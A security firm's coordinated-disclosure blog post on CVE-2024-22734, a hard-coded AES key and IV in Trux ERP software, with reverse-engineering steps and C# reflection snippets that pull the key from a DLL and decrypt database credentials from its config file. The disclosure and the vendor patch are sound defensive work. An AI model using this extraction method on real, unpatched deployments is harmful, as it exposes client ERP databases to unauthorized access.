

[![Redline Cyber Security Logo](https://cdn.prod.website-files.com/64656e700a1d9566ec780de0/6494f42f7a143f705f622a5e_Redline%20Cyber%20Security%20-%201line.png)](/)[Home](/)

Services[![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/64b1e86042d234236e1782ae_App%20Sec.svg)Application Security

Secure your mission-critical applications](/services/application-security-penetration-testing)[![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/64b1e86b1aecdee44be75dde_Net%20Sec.svg)Network Security

Assess and improve your network security](/services/network-security-penetration-testing)[![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/64b1e858c2d06f124166b84f_Cloud%20Sec.svg)Cloud Security

Secure your cloud environment](/services/cloud-security-penetration-testing)[![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/64b1e84e42d234236e17759b_Enterpr%20Sec.svg)Enterprise Security

Protecting corporate networks](/services/enterprise-security-monitoring-solutions)[![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/64b34c3a00ba11f2a0d19beb_Adv%20Emul%20(1).svg)Adversary Emulation

Simulating real-world attacks](/services/cybersecurity-adversary-emulation)[![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/64b1e83a5e73b516e5ac5529_Cyber%20Sec.svg)Security Training

Enhancing your cyber knowledge](/services/cybersecurity-training-consulting)Your Cybersecurity Partner

Industries[![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/64b673dd04cc73cdb9214a18_Fin-Tech.svg)Finance

Securing Financial Transactions & Data](/industries/cybersecurity-solutions-for-the-finance-industry)[![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/64b673c6ad9df4dad1d24060_SaaS.svg)Technology

Guarding Tech Innovations & Systems](/industries/cybersecurity-for-the-technology-industry)[![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/64ed4c0d810fb76ee182016b_Government.svg)Government

Protecting Public Data & Services](/industries/cybersecurity-for-the-government)[![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/64b67418a3df762ba8bd1cd3_Healthcare.svg)Healthcare

Safeguarding Patient Data & Care](/industries/cybersecurity-for-the-healthcare-industry)[![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/64b673f5a3df762ba8bce3cc_Energy.svg)Energy

Protecting Energy's Digital Landscape](/industries/cybersecurity-for-the-energy-industry)[![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/64ed539fa3afc287750e7a9c_Manufacturing.svg)Manufacturing

Securing Production & Supply Chain](/industries/cybersecurity-for-the-manufacturing-industry)Your Cybersecurity Partner[Blog](/blog)[About](/about)[Secure Your Business](/contact)[Blog](/blog)

[Coordinated Disclosure](/blog-categories/coordinated-disclosure)
# CVE-2024-22734: Zero Day Exploit Write-Up

ByRedline Cyber SecurityApr 9, 2024â¢10min read![Picture of bridge from Detroit to Canada with text "CVE-2024-22734 - Trux ERP Software .NET 0day Discovery"](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/66009b9397fdea31bc9d0f3e_Pasted%20image%2020240323222613.png)
### Abstract

In this blog post, we disclose a critical security vulnerability ([CVE-2024-22734](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22734)) discovered in [Trux](https://www.amcsgroup.com/solutions/enterprise-management/trux/), a leading waste management ERP software developed by [AMCS Group](https://www.amcsgroup.com/). The flaw, identified during a routine penetration test conducted by Redline Cyber Security, involves a static, hard-coded AES Key-IV pair that led to a complete takeover of the application and full access to the integrated ERP database of any client deployment. This report outlines the discovery process, technical details, potential impacts, and the collaborative efforts made with AMCS Group to remediate this issue.

### Introduction

During a routine penetration test of a client using the [Trux](https://www.amcsgroup.com/solutions/enterprise-management/trux/) software, a critical vulnerability was identified. This issue stemmed from the use of a static, global hard-coded AES Key-IV pair, along with a predictable encryption algorithm within the software. The presence of this hard-coded key enables the decryption of application secrets and access to privileged database account credentials. This, in turn, could compromise the backend client ERP data. While this issue requires local access to exploit and is not remotely exploitable, its significance cannot be understated, especially considering the broader customer base of [AMCS](https://www.amcsgroup.com/about-amcs/). Consequently, this emphasized the need for a well-coordinated and responsible disclosure process to address the potential risk for organizations relying on Trux software for waste management operations.

### Discovery of the Vulnerability

##### **Deployment and Configuration**

Trux software, commonly used in the waste management industry, is typically deployed as a thick client on user workstations or over a network file share using SMB protocol. This simple 2-tier architecture allows for direct connections to the backend database for the real-time operational data access required in this sector. There is no intermediary between the client and server.

![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/6614b04aadc4331bc6392c9d_Pasted%20image%2020240323215754.png)

Notably, the software's installation on a UNC file share accessed via SMB is considered legacy, yet is still prevalent in the industry. This method often leads to misconfigurations, especially in the program files' permissions, where the assemblies (.dll files) necessary for the application's operation are stored. These files, ideally read-only, can sometimes be misconfigured to allow read/write access, increasing the risk of unauthorized modifications or exploitations.

##### **Assembly Analysis and Debugging**

![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/6614b0d8d0f237f4dfb19f29_Pasted%20image%2020240323220417.png)

We reviewed the assemblies of the Trux application to understand its internal workings and identify potential security flaws. Assemblies in thick client applications like Trux contain crucial code and logic that, when decompiled, provide insights into data handling, encryption practices, and possible vulnerabilities. By examining these assemblies, we can assess how the application manages its security, often leading to discoveries of critical vulnerabilities hidden within the application libraries. In order to determine which assembly to start with, the application is launched with [dnSpy](https://github.com/dnSpy/dnSpy) (our decompiler of choice for .NET applications) to begin the reverse-engineering process.

##### **Initial Findings**

In our security assessments of thick client applications, we often start by searching for hardcoded sensitive data such as credentials and encryption keys, which can sometimes be found in configuration files without needing to decompile the application. For instance, while using [Procmon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) to examine the Trux software at launch, we noticed that it reads data from the **TruxUser.cfg** file prompting further investigation into its contents. This file contains various settings, including an encrypted string crucial for database connectivity. The decryption of this string is pivotal for the application's functionality, providing the credentials necessary to access the backend database.

![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/6614b14e18177b34b7632edf_Pasted%20image%2020240323220207.png)
##### Digging deeper...

As there was no direct information disclosure in the configuration due to the encrypted secret, we had to pivot into decompiling the application and begin the debugging process using dnSpy.

![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/6614b18e56068900c795781c_Pasted%20image%2020240324143244.png)

Viewing the strings in the process memory of **Trux.exe** we knew the application is providing some sort of decryption of the cipher-text found in the configuration, and then loading those credentials into its process memory.

![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/6614b1b59bb33b0cb1a95939_Pasted%20image%2020240324143546.png)

The application first parses the configuration file and feeds it through obfuscated functions to decrypt the ciphertext. By setting breakpoints in key areas, we were able to watch and follow this data as it moved through the application's code flow.

![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/6614b1d4864e900c43da87d9_Pasted%20image%2020240323223633.png)
##### Tracing the Dataflow and Decoding the Secret

In our analysis, we pinpointed that sensitive operations related to the database connection were executed within the **TxUtilities.dll** assembly. Our dataflow investigation revealed a complex series of obfuscated functions leading to the retrieval of a database secret fragment stored in the variable **u0002**. This fragment, essentially the first part of the database credentials, is a hard-coded prefix embedded within the source code but obscured through heavy obfuscation and dynamically accessed during runtime.

![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/6614b22471144580e2d2367a_Pasted%20image%2020240324151548.png)

Interestingly, the prefix remains unchanged even when the cipher-text in the configuration file is altered. We confirmed this by modifying the cipher-text by one character and monitoring the application's reaction in the **u0002** variable. After the modification of the cipher-text, the prefix stayed consistent, but the subsequent segment failed to decrypt properly, resulting in a display of random characters instead of the expected cleartext value.

![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/6614b258a75ae17ac700e0cf_Pasted%20image%2020240324151001.png)

By setting breakpoints and inspecting variables, we verified that the `\u0005` field stores the result of the predictable de-obfuscation routine, resulting in the first part of the database password. Essentially, the credentials are a mix of a hard-coded prefix, de-obfuscated and stored in the variable `\u0005`, and an encrypted portion from the configuration file, culminating in the full credential represented by the variable **u0002**.

Upon uncovering the predictable algorithm, we proceeded to search for the decryption key within the **TxUtilities.Database** class using dnSpy. Our reversing revealed private fields marked with obscure identifiers, **\u001A** and **\u001B**, whose purposes weren't immediately clear, likely due to obfuscation aimed at making reverse engineering more difficult. By setting breakpoints and executing the application, we confirmed that these fields indeed contained the AES IV and Key used to decrypt the cipher-text in the configuration file.

With the AES key and the predictable algorithm in hand, we are now equipped to craft an exploit for this vulnerability.

### Exploitation via C# Reflection

By leveraging reflection, we bypassed the conventional access controls typically used in C# applications to uncover hardcoded cryptographic keys. With the ability to read the contents of the program files directory (where the application assemblies are stored), we used reflection to dynamically load the **TxUtilities.dll** file into memory. This approach allowed us to inspect and interact with the DLL's internal structures without modifying or directly executing the file, circumventing traditional security measures.

First, we loaded the **TxUtilities.dll** assembly,

```

Assembly assembly = Assembly.LoadFrom("TxUtilities.dll");

```

Then we targeted the **TxUtilities.Database** class

```

Type type = assembly.GetType("TxUtilities.Database");

```

Next, we created an instance of the **TxUtilities.Database** class to access its private fields.

```

object classInstance = Activator.CreateInstance(type);

```

The database user and password prefix are extracted using reflection

```

string fieldValue3 = GetPrivateFieldValue<string>(type, classInstance, "\u0003");
string fieldValue5 = GetPrivateFieldValue<string>(type, classInstance, "\u0005");

```

We then extracted the Base64 encrypted value from the **TruxUser.cfg** file

```

string base64Value = ExtractBase64Value("TruxUser.cfg");

```

The AES IV and Key are retrieved to decrypt the cipher-text

```

byte[] fieldValueIV = GetPrivateFieldValue<byte[]>(type, classInstance, "\u001A");
byte[] fieldValueKey = GetPrivateFieldValue<byte[]>(type, classInstance, "\u001B");
byte[] cipherTextBytes = Convert.FromBase64String(base64Value);
string decryptedText = DecryptStringFromBytes_Aes(cipherTextBytes, fieldValueKey, fieldValueIV);

```

Lastly, we combined the decrypted password with the prefix to display the full database credentials.

```

string cleanedText = decryptedText.Replace("\0", string.Empty);
Console.WriteLine("Database User : [" + fieldValue3 + "]");
Console.WriteLine("Database Password: [" + fieldValue5 + cleanedText + "]");

```
#### Exploit POC

![](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/6600a202b967491a9d20dba9_Exploit%20POC%2020240324170730.png)

We will post the full exploit POC code [HERE](https://github.com/securekomodo) shortly following this public release of [CVE-2024-22734](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22734).

â

#### Coordinated Disclosure

After uncovering this vulnerability within the Trux software, we engaged in a responsible and coordinated disclosure process with AMCS Group. Recognizing the potential impact, we worked diligently with AMCS to ensure that a robust patch was developed and deployed in a timely manner.

**Vendor Patch and Security Update** **AMCS Group has addressed this vulnerability by releasing a security update, which includes a patch to rectify the predictable algorithm and hardcoded AES Key-IV issue. Clients are urged to reach out and apply this update immediately to secure their systems against potential exploitation.**

AMCS has provided the following guidance for Trux users:
Please contact [AMCS TRUX Support](https://www.support.amcsgroup.com/) at 1Â (800) 962-9264 to coordinate installation of *TRUX Patch Version 7.19.0018.26912*
AMCS Support Portal: <https://www.support.amcsgroup.com/>

#### Coordinated Disclosure Timeline

- **11/20/2023**: The vulnerability was initially identified by Bryan Smith ([@securekomodo](https://twitter.com/securekomodo)) during a routine penetration test.
- **11/29/2023**: AMCS Group was informed of the finding
- **01/03/2024**: VINCE case was opened with [CERT/CC](https://www.kb.cert.org/vuls/) to assist with coordinated disclosure.
- **01/29/2024**: MITRE assigns and reserves [CVE-2024-22734](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22734) to track this vulnerability.
- **02/19/2024**: Collaborative efforts for patch development were undertaken, culminating in the release of the TRUX Patch Version 7.19.0018.26912.
- **04/09/2024**: Following the successful deployment of the patch and AMCS verification, we proceeded with the public disclosure of this vulnerability.

#### Acknowledgments

Thank you to AMCS Group for their response and cooperative stance throughout the disclosure process. Their commitment to security and willingness to work alongside our team at Redline Cyber Security has been highly effective in transparently mitigating this vulnerability.

Share this post:Blog category:[Coordinated Disclosure](/blog-categories/coordinated-disclosure)![Redline Cyber Security](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/64af6c8638da68a9feac4af7_Social%20media%20DP%20-%20SVG.svg)Redline Cyber SecurityRedline Cyber Security is a security firm specializing in penetration testing and security assessments. Our team of industry-certified experts conducts thorough penetration tests to help secure your business before attackers can strike.

The Latest Blog Posts

## Discover More Insights

[![Redline Pentesters Bryan Smith and Mike Peck pictured on stage during the GrrCON 2024 OSINT CTF winner's panel.](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/66fb413c5449520b64a8a8f4_redline-grrcon-osint-ctf-win-2024.jpeg)

News

### Redline Wins First Place at GrrCON 2024 OSINT CTF

Redline Cyber Security pentesters won the 2024 GrrCON OSINT CTF, marking their third victory. They used OSINT techniques to solve challenges and earned a black badge...

Read more

3min read](/blog/redline-wins-first-place-at-grrcon-2024-osint-ctf)[![Picture of Ivanti Mobile Iron building with text "Exploit Writeup for CVVE-2024022026 Rooting Ivanti EPMM"](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/6644158a9791a23aeb75b253_Ivanti-CVE-2024-22026-Thumbnail.png)

Coordinated Disclosure

### Exploiting CVE-2024-22026: Rooting Ivanti EPMM "MobileIron Core"

Discovered by Redline Cyber Security researcher Bryan Smith, CVE-2024-22026 is a local privilege escalation vulnerability in Ivanti EPMM (formerly MobileIron) server versions prior to 12.1.0.0, 12.0.0.0, and 11.12.0.1.

Read more

10min read](/blog/exploiting-cve-2024-22026-rooting-ivanti-epmm-mobileiron-core)[![Picture of bridge from Detroit to Canada with text "CVE-2024-22734 - Zero Day Exploit Write-Up"](https://cdn.prod.website-files.com/64a287bc064b6f57de67b6be/66009e6fea1049f774be21d8_2024-03-24_17-42-16.png)

Coordinated Disclosure

### CVE-2024-22734: Zero Day Exploit Write-Up

We discovered a Zero Day in Trux Waste Management Software (CVE-2024-22734), revealing a hardcoded AES Key-IV vulnerability, and through coordinated disclosure worked with vendor to for a remediation

Read more

10min read](/blog/cve-2024-22734)[See More Blog Posts](/blog)
## Secure Your Digital Assets

[Secure Your Business](/contact)[![Redline Cyber Security Logo](https://cdn.prod.website-files.com/64656e700a1d9566ec780de0/6494f42e007f7c7628e6ca5c_Redline%20Cyber%20Security%20-%202lines.png)](/)Based in Detroit, USA
Ready to serve you globally.

Contact:
+1 (313) 306-7465
info@redlinecybersecurity.com
### Services

[Application Security](/services/application-security-penetration-testing)[Network Security](/services/network-security-penetration-testing)[Cloud Security](/services/cloud-security-penetration-testing)[Enterprise Security](/services/enterprise-security-monitoring-solutions)[Adversary Emulation](/services/cybersecurity-adversary-emulation)[Security Training](/services/cybersecurity-training-consulting)
### Industries

[Finance](/industries/cybersecurity-solutions-for-the-finance-industry)[Technology](/industries/cybersecurity-for-the-technology-industry)[Government](/industries/cybersecurity-for-the-government)[Healthcare](/industries/cybersecurity-for-the-healthcare-industry)[Energy](/industries/cybersecurity-for-the-energy-industry)[Manufacturing](/industries/cybersecurity-for-the-manufacturing-industry)
### Quick Links

[Home](/)[About](/about)[Blog](/blog)[Contact Us](/contact)Â© 2024 Redline Cyber Security. All rights reserved.
Built by Pinecone Agency
[Privacy Policy](/privacy-policy)[Disclosure Policy](/coordinated-disclosure-policy)[Acknowledgements](/security-acknowledgments)[Terms of Service](/terms-of-service)

